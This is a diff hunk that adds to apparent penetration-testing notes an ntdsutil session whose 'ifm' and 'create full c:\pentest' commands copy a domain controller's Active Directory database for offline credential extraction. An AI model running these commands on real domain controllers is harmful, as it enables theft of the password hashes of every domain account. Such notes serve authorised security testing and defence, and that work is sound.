@@ -296,6 +296,15 @@ To find where NTDS is run the below:
 
 ### ntdsutil
 
+```
+C:\>ntdsutil
+ntdsutil: activate instance ntds
+ntdsutil: ifm
+ifm: create full c:\pentest
+ifm: quit
+ntdsutil: quit
+```
+
 `ntdsutil`
 
 `ntdsutil: snapshot`
